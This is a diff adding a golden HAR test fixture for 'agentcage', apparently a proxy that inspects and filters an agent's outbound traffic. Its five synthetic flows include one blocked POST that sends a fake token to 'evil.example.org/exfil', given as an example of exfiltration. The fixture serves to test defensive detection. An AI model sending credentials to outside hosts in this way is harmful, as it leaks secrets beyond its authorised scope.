@@ -1,0 +1,263 @@
+{
+  "log": {
+    "creator": {
+      "name": "agentcage",
+      "version": "0.0.0-golden"
+    },
+    "entries": [
+      {
+        "cache": {},
+        "comment": "{\"flow_id\": \"flow-0001\", \"direction\": \"outbound\", \"decision\": \"allowed\", \"inspectors\": [], \"view\": \"inbound\"}",
+        "request": {
+          "bodySize": 0,
+          "cookies": [],
+          "headers": [
+            {
+              "name": "Host",
+              "value": "api.example.com"
+            },
+            {
+              "name": "Accept",
+              "value": "application/json"
+            }
+          ],
+          "headersSize": -1,
+          "httpVersion": "HTTP/1.1",
+          "method": "GET",
+          "queryString": [
+            {
+              "name": "key",
+              "value": "val"
+            },
+            {
+              "name": "page",
+              "value": "2"
+            }
+          ],
+          "url": "https://api.example.com/v1/data?key=val&page=2"
+        },
+        "response": {
+          "bodySize": 11,
+          "content": {
+            "mimeType": "application/json",
+            "size": 11,
+            "text": "{\"ok\":true}"
+          },
+          "cookies": [],
+          "headers": [
+            {
+              "name": "Content-Type",
+              "value": "application/json"
+            }
+          ],
+          "headersSize": -1,
+          "httpVersion": "HTTP/1.1",
+          "redirectURL": "",
+          "status": 200,
+          "statusText": "OK"
+        },
+        "startedDateTime": "2024-01-01T00:00:00+00:00",
+        "time": 0,
+        "timings": {
+          "receive": -1,
+          "send": -1,
+          "wait": -1
+        }
+      },
+      {
+        "cache": {},
+        "comment": "{\"flow_id\": \"flow-0002\", \"direction\": \"outbound\", \"decision\": \"flagged\", \"inspectors\": [{\"name\": \"entropy\", \"severity\": \"warning\", \"reason\": \"high-entropy body\"}], \"view\": \"inbound\"}",
+        "request": {
+          "bodySize": 27,
+          "cookies": [],
+          "headers": [
+            {
+              "name": "Host",
+              "value": "upload.example.net"
+            },
+            {
+              "name": "Content-Type",
+              "value": "text/plain"
+            }
+          ],
+          "headersSize": -1,
+          "httpVersion": "HTTP/2.0",
+          "method": "POST",
+          "postData": {
+            "encoding": "base64",
+            "mimeType": "text/plain",
+            "text": "c2VjcmV0LWxvb2tpbmctYmxvYg=="
+          },
+          "queryString": [],
+          "url": "https://upload.example.net/put"
+        },
+        "response": {
+          "bodySize": 4,
+          "content": {
+            "encoding": "base64",
+            "mimeType": "text/plain",
+            "size": 4,
+            "text": "b2s="
+          },
+          "cookies": [],
+          "headers": [
+            {
+              "name": "Content-Type",
+              "value": "text/plain"
+            }
+          ],
+          "headersSize": -1,
+          "httpVersion": "HTTP/2.0",
+          "redirectURL": "",
+          "status": 201,
+          "statusText": "Created"
+        },
+        "startedDateTime": "2024-01-01T00:01:00+00:00",
+        "time": 0,
+        "timings": {
+          "receive": -1,
+          "send": -1,
+          "wait": -1
+        }
+      },
+      {
+        "cache": {},
+        "comment": "{\"flow_id\": \"flow-0003\", \"direction\": \"outbound\", \"decision\": \"blocked\", \"inspectors\": [{\"name\": \"domain\", \"severity\": \"error\", \"reason\": \"not in allowlist\"}, {\"name\": \"secrets\", \"severity\": \"critical\", \"reason\": \"credential in body\"}], \"view\": \"inbound\"}",
+        "request": {
+          "bodySize": 27,
+          "cookies": [],
+          "headers": [
+            {
+              "name": "Host",
+              "value": "evil.example.org"
+            },
+            {
+              "name": "Content-Type",
+              "value": "application/x-www-form-urlencoded"
+            }
+          ],
+          "headersSize": -1,
+          "httpVersion": "HTTP/1.1",
+          "method": "POST",
+          "postData": {
+            "mimeType": "application/x-www-form-urlencoded",
+            "text": "token=FAKE-NOT-A-REAL-TOKEN"
+          },
+          "queryString": [],
+          "url": "https://evil.example.org/exfil"
+        },
+        "response": {
+          "bodySize": -1,
+          "content": {
+            "mimeType": "",
+            "size": 0
+          },
+          "cookies": [],
+          "headers": [],
+          "headersSize": -1,
+          "httpVersion": "HTTP/1.1",
+          "redirectURL": "",
+          "status": 0,
+          "statusText": ""
+        },
+        "startedDateTime": "2024-01-01T00:02:00+00:00",
+        "time": 0,
+        "timings": {
+          "receive": -1,
+          "send": -1,
+          "wait": -1
+        }
+      },
+      {
+        "cache": {},
+        "comment": "{\"flow_id\": \"flow-0004\", \"direction\": \"inbound\", \"decision\": \"allowed\", \"inspectors\": [], \"view\": \"inbound\"}",
+        "request": {
+          "bodySize": 4,
+          "cookies": [],
+          "headers": [
+            {
+              "name": "Host",
+              "value": "127.0.0.1:3000"
+            }
+          ],
+          "headersSize": -1,
+          "httpVersion": "HTTP/1.1",
+          "method": "PUT",
+          "postData": {
+            "mimeType": "",
+            "text": "ping"
+          },
+          "queryString": [],
+          "url": "http://127.0.0.1:3000/hook"
+        },
+        "response": {
+          "bodySize": 0,
+          "content": {
+            "mimeType": "",
+            "size": 0
+          },
+          "cookies": [],
+          "headers": [],
+          "headersSize": -1,
+          "httpVersion": "HTTP/1.1",
+          "redirectURL": "",
+          "status": 204,
+          "statusText": "No Content"
+        },
+        "startedDateTime": "2024-01-01T00:03:00+00:00",
+        "time": 0,
+        "timings": {
+          "receive": -1,
+          "send": -1,
+          "wait": -1
+        }
+      },
+      {
+        "cache": {},
+        "comment": "{\"flow_id\": \"flow-0005\", \"direction\": \"outbound\", \"decision\": \"allowed\", \"inspectors\": [{\"name\": \"content-type\", \"severity\": \"info\", \"reason\": \"binary\"}], \"view\": \"inbound\"}",
+        "request": {
+          "bodySize": 0,
+          "cookies": [],
+          "headers": [
+            {
+              "name": "Host",
+              "value": "cdn.example.com"
+            }
+          ],
+          "headersSize": -1,
+          "httpVersion": "HTTP/1.1",
+          "method": "HEAD",
+          "queryString": [],
+          "url": "https://cdn.example.com/a/b/c.bin"
+        },
+        "response": {
+          "bodySize": 0,
+          "content": {
+            "mimeType": "application/octet-stream",
+            "size": 0
+          },
+          "cookies": [],
+          "headers": [
+            {
+              "name": "ETag",
+              "value": "\"abc\""
+            }
+          ],
+          "headersSize": -1,
+          "httpVersion": "HTTP/1.1",
+          "redirectURL": "",
+          "status": 304,
+          "statusText": "Not Modified"
+        },
+        "startedDateTime": "2024-06-01T12:00:00+00:00",
+        "time": 0,
+        "timings": {
+          "receive": -1,
+          "send": -1,
+          "wait": -1
+        }
+      }
+    ],
+    "version": "1.2"
+  }
+}
